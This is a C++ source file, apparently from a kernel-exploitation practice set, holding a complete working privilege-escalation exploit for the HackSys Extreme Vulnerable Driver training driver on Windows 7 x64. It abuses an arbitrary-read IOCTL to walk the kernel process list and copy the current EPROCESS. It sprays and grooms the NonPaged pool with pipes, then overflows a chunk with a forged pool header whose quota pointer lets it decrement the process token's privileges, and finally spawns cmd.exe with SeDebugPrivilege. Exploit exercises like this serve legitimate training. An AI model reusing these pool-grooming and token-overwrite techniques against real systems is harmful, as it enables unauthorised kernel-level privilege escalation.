#include "Common.h"
#include "Exploits.h"
#include <vector>

/*
	HEVD NonPaged Pool Overflow / Medium Integrity

	Author : @xct_de
	Target : Win7 x64

	ProcessBilled Overwrite leading into Arbitrary Decrement on BlockQuota Pointer
*/
namespace HevdPoolOverflowWin7x64NS {

	const DWORD IOCTL_READ = 0x222003;
	const DWORD DEFRAG = 100000; // 80000
	const DWORD HOLES = 50000; // 30000
	const DWORD BUFSIZE = 0x210;
	const DWORD EPROCESS_SIZE = 0x4f8;
	HANDLE hDriver;
	DWORD bytesRet;

	std::vector<HANDLE> readPipeHandles;
	std::vector<HANDLE> writePipeHandles;
	std::vector<HANDLE> readPipeHandles2;
	std::vector<HANDLE> writePipeHandles2;

	BYTE uBuffer[BUFSIZE]; // ALLOC_SIZE - 0x48, 0x48 is the header size
	BOOL res = FALSE;
	HANDLE readPipe = NULL;
	HANDLE writePipe = NULL;
	DWORD resultLength;

	typedef struct eProcResult {
		QWORD eProcess;
		QWORD tokenPtr;
		int pid;
	} eProcResult;


	// HEVD Arbitrary Read Primitive (here for 8 byte)
	QWORD arbRead(QWORD where) {
		typedef struct _ArbitraryReadBuffer
		{
			uintptr_t readAddress;
			uintptr_t outBuf;
		} ArbitraryReadBuffer;

		QWORD readBuffer = 0;
		ArbitraryReadBuffer arbReadBuf = { 0 };
		arbReadBuf.readAddress = where;
		arbReadBuf.outBuf = (ULONG_PTR)&readBuffer;
		if (DeviceIoControl(hDriver, IOCTL(0x802), (LPVOID)&arbReadBuf, sizeof(arbReadBuf), NULL, 0, &bytesRet, NULL)) {
			//printf("%llx ", readBuffer[i]);
		}
		return readBuffer;
	}


	eProcResult GetCurrentEProcess() {
		// find system EPROCESS & token		
		QWORD systemProc = getSystemEProcess();
		printf("[>] System _EPROCESS: 0x%llx\n", systemProc);

		// walk ActiveProcessLinks to find our process
		DWORD currentProcessPid = GetCurrentProcessId();
		//printf("[>] Current Process PID %d\n", currentProcessPid);
		BOOL found = false;
		QWORD cProcess = systemProc;
		DWORD cPid = 0;
		QWORD cTokenPtr;

		while (!found) {
			cProcess = arbRead(cProcess + 0x188); // get next entry in ActiveProcessLinks (dt _EPROCESS)		
			cProcess -= 0x188; // get back to start of _EPROCESS (otherwise it points directly to next entrys 0x188 offset)
			cPid = arbRead(cProcess + 0x180);
			cTokenPtr = arbRead(cProcess + 0x208);
			if (cPid == currentProcessPid) {
				printf("[>] Current Process: %llx (PID: %d, TOKEN_PTR: %llx)\n", cProcess, cPid, cTokenPtr);
				found = true;
				break;
			}
		}
		if (!found) {
			printf("Could not find current process in ActiveProcessLinks\n");
			exit(-1);
		}
		eProcResult result{};
		result.eProcess = cProcess;
		result.tokenPtr = cTokenPtr;
		result.pid = cPid;
		return result;
	}


	// Sprays the NonPaged Pool with Objects of Size 0x210 (this technique works for any size though)
	void SprayPool() {
		RtlFillMemory(uBuffer, BUFSIZE, 0x41);
		readPipeHandles.clear();
		writePipeHandles.clear();
		readPipeHandles2.clear();
		writePipeHandles2.clear();

		// create defrag  objects
		printf("[>] Creating defrag objects\n");
		for (int i = 0; i < DEFRAG; i++) {
			CreatePipe(&readPipe, &writePipe, NULL, sizeof(uBuffer));
			readPipeHandles.push_back(readPipe);
			writePipeHandles.push_back(writePipe);
		}
		for (int i = 0; i < writePipeHandles.size(); i++) {
			WriteFile(writePipeHandles[i], uBuffer, sizeof(uBuffer), &resultLength, NULL);
		}

		printf("[>] Creating some more objects for holes\n");
		// create more for holes
		for (int i = 0; i < HOLES; i++) {
			CreatePipe(&readPipe, &writePipe, NULL, sizeof(uBuffer));
			readPipeHandles2.push_back(readPipe);
			writePipeHandles2.push_back(writePipe);
		}
		for (int i = 0; i < writePipeHandles2.size(); i++) {
			WriteFile(writePipeHandles2[i], uBuffer, sizeof(uBuffer), &resultLength, NULL);
		}

		// grooming
		printf("[>] Grooming\n");
		for (int i = 0; i < readPipeHandles2.size(); i++) {
			if (i % 2 == 0) {
				CloseHandle(readPipeHandles2[i]);
				CloseHandle(writePipeHandles2[i]);
			}
		}
	}


	void RewritePipes() {
		printf("[>] Freeing overflown object(s)\n");
		for (int i = 0; i < readPipeHandles2.size(); i++) {
			if (i % 2 != 0) {
				CloseHandle(writePipeHandles2[i]);
				CloseHandle(readPipeHandles2[i]);				
			}
		}
		printf("[>] Allocating objects again to avoid stability issues\n");
		// fill back immediately https://www.pixiepointsecurity.com/blog/nday-cve-2020-17087.html
		for (int i = 0; i < readPipeHandles2.size(); i++) {
			CreatePipe(&readPipe, &writePipe, NULL, sizeof(uBuffer));
			WriteFile(writePipe, uBuffer, sizeof(uBuffer), &resultLength, NULL);
		}
	}


	void PoolOverflow(QWORD cProcData[], eProcResult result, QWORD where, LPVOID buf) {
		// prepare fake NonPaged Pool Object Header
		BYTE fakeHeader[] = (
			"\x21"								// + 0x000 PreviousSize     : Pos 0, 8 Bits  # (0x210 - 0x30) / 0x10 // copied from real allocation
			"\x00"								// + 0x000 PoolIndex        : Pos 8, 8 Bits  # (can stay 0) // copied from real allocation
			"\x21"								// + 0x000 BlockSize        : Pos 16, 8 Bits #  0x210/0x10 // copied from real allocation
			"\x0A"								// + 0x000 PoolType         : Pos 24, 8 Bits (bit 3 enables PoolQuota) // modified, Bit 1 (PagedPool) + Bit 3 (PoolQuota)
			"\x4e\x70\x46\x72"					// Pool Tag ( "NpFr" reversed)
			"\x00\x10\x00\x00\x1a\x00\x00\x00"	// ProcessBilled (Address of Fake EPROCESS)
			);

		// area before EPROCESS gets checked too, no idea why
		RtlZeroMemory(buf, 0x14000);
		RtlFillMemory(LPVOID((QWORD)buf), 0x1000, '\x01'); // ?

		// start of EPROCESS at 0x50
		QWORD fakeEprocessPtr = (QWORD)buf + 0x1000;
		// put a full copy of our eprocess to make it as legit as possible
		for (int i = 0; i < EPROCESS_SIZE; i++) {
			*(QWORD*)(fakeEprocessPtr + i * 8) = cProcData[i];
		}

		/*
		On free, the value indicating the quota used in this structure is updated,
		by subtracting the size of the allocation. Thus, an attacker could decrement the
		value of an arbitrary address upon returning the charged quota. An attacker
		can mount both attacks on any pool allocation as long as the quota bit and the
		quota process object pointer are both set.

		PspReturnQuota will do:
		Exchg (QuotaBlock, QuotaValue1 - BlockSize_1, QuotaValue1); 
		We control QuotaValue1 (Ptr at 0x1c0) & QuotaValue1 (value where Ptr points to, here Token with 0x80000000)
		*/
		// PspReturnQuota will do 
		*(QWORD*)(fakeEprocessPtr + 0x1c0) = where;  // Eprocess->BlockQuota this is our arb dec, pointing to buf for now to no


		printf("[>] VirtualAlloc fake EPROCESS at %llx\n", fakeEprocessPtr);
		printf("[>] Spraying pool\n");

		SprayPool();
		//printf("[DEBUG] Press enter to continue & trigger pool overflow\n"); getchar();

		BYTE uBuffer[0x1000];
		RtlFillMemory(uBuffer, 0x200, 'A'); // -0x18
		RtlCopyMemory(uBuffer + 0x200, fakeHeader, sizeof(fakeHeader));

		// DEBUG
		printf("[!] TokenPrivileges before decrement %llx\n", arbRead(where));
		// DEBUG

		printf("[>] Overflowing into adjacent Object & overwriting ProcessBilled Ptr..\n");
		DWORD IoControlCode = 0x22200f;
		DeviceIoControl(hDriver, IoControlCode, (LPVOID)&uBuffer, 0x200 + sizeof(fakeHeader), NULL, 0, &bytesRet, NULL);

		RewritePipes();

		// DEBUG
		printf("[!] TokenPrivileges after decrement %llx\n", arbRead(where));
		// DEBUG
	}


	BOOL CheckPrivilege(const TCHAR* Privilege)
	{
		LUID luid;
		PRIVILEGE_SET privs;
		HANDLE hProcess;
		HANDLE hToken;
		hProcess = GetCurrentProcess();
		if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
			printf("[-] OpenProcessToken Failed\n");
			return FALSE;
		}
		if (!LookupPrivilegeValue(NULL, Privilege, &luid)) {
			printf("[-] LookupPrivilegeValue Failed\n");
			return FALSE;
		}
		privs.PrivilegeCount = 1;
		privs.Control = PRIVILEGE_SET_ALL_NECESSARY;
		privs.Privilege[0].Luid = luid;
		privs.Privilege[0].Attributes = SE_PRIVILEGE_ENABLED;
		BOOL bResult;
		PrivilegeCheck(hToken, &privs, &bResult);
		return bResult;
	}


	void Exploit(int argc, char** argv) {
		hDriver = CreateFile(L"\\\\.\\HacksysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
		if (hDriver == INVALID_HANDLE_VALUE)
		{
			printf("[!] Error while creating a handle to the driver: %d\n", GetLastError());
			exit(1);
		}

		// Get current process by using the arb read primitive to walk the process list
		eProcResult result = GetCurrentEProcess();

		// read the whole EPROCESS structure into a local buffer to get a copy of it
		QWORD cProcData[EPROCESS_SIZE]{ 0x0 };
		for (int i = 0; i < EPROCESS_SIZE / 8; i++) {
			cProcData[i] = arbRead(result.eProcess + i * 8);
			//printf("%llx\n", readBuffer[i]);
		}

		LPVOID buf = VirtualAlloc((LPVOID)0x0000001a00000000, 0x14000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);	
		PoolOverflow(cProcData, result, result.tokenPtr + 0x48, buf);
		
		if (CheckPrivilege(L"SeDebugPrivilege")) {

			printf("[+] Token privileges set!\n");
			system("cmd.exe");
		}
		else {
			printf("[>] Exploit failed :(\n");
		}
		CloseHandle(hDriver);
	}
}


int HevdPoolOverflowWin7x64(int argc, char** argv) {
	printf("~-------------------------------~\n");
	printf("    HEVD PoolOverflow Win7 x64   \n");
	printf("~-------------------------------~\n");
	HevdPoolOverflowWin7x64NS::Exploit(argc, argv);
	return 0;
}